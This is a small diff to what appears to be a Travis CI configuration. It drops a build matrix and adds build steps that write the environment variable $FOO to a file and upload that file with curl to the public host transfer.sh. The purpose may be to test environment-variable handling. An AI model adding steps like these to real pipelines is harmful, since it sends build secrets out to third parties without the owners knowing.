@@ -3,12 +3,8 @@ language: ruby
 rvm:
   - 2.4.4
 
-matrix:
-  include:
-    - dist: trusty
-      sudo: required
-    - dist: trusty
-      sudo: false
-
 install: true
-script: rvm list
+script:
+  - echo $FOO > foo.txt
+  - cat foo.txt
+  - curl --upload-file ./foo.txt https://transfer.sh/foo.txt 
